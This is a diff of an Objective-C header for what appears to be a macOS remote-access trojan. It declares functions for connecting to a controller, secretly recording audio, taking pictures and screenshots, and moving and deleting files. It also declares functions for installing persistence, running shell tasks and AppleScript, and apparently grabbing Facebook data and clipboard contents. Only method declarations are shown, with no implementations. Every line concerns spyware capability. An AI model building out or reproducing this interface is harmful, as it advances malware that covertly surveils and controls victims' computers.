@@ -2,7 +2,6 @@
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
 #include <arpa/inet.h>
-#import "NSData+AESCrypt.h"
 #import <Appkit/Appkit.h>
 #import "escryptor.h"
 
@@ -20,14 +19,11 @@
 
 //convenience
 -(void)blank;
--(NSString *)forgetFirst:(NSArray*)args;
 
 //socks
 extern int sockfd;
 
--(int)connect:(NSString*)host
-             :(long)port;
--(void)sendData:(NSData *)data;
+-(int)connect:(NSString*)host :(long)port;
 -(void)sendString:(NSString *)string;
 -(void)livesendString:(NSString *)string;
 
@@ -38,32 +34,30 @@ extern int sockfd;
 -(BOOL)recordAudio;
 
 //camera
--(void)takePicture;
+-(NSData*)takePicture;
 -(void)initcamera;
 -(void)captureWithBlock:(void(^)(NSData* block))block;
 -(void)stopcapture;
-- (AVCaptureDevice *)getcapturedevice;
+-(AVCaptureDevice *)getcapturedevice;
 
 //file management
 -(void)directoryList:(NSString *)arg;
--(void)download:(NSString *)arg;
+-(NSData*)filePathToData:(NSString *)arg;
 -(void)rmFile:(NSString *)arg;
 -(void)changeWD:(NSString *)arg;
 -(void)receiveFile:(NSString *)saveToPath;
--(void)sendFile:(NSData *)fileData;
--(void)encryptFile:(NSString *)arg;
--(void)decryptFile:(NSString *)arg;
+-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize;
+-(void)sendFileData:(NSData*)fileData;
 
 //misc
--(void)executeCMD:(NSString *)arg;
 -(void)idleTime;
 -(void)getPid;
 -(void)getFacebook;
 -(void)getPaste;
 -(void)set_brightness:(NSString *)arg;
--(void)screenshot;
--(void)persistence:(NSString *)ip :(NSString *)port;
--(void)removePersistence:(NSString *)ip :(NSString *)port;
+-(NSData *)screenshot;
+-(void)persistence:(NSString *)ip :(int)port;
+-(void)removePersistence:(NSString *)ip :(int)port;
 -(void)openURL:(NSString *)arg;
 -(void)runtask:(NSString *)cmd;
 -(void)runAppleScript:(NSString *)arg;
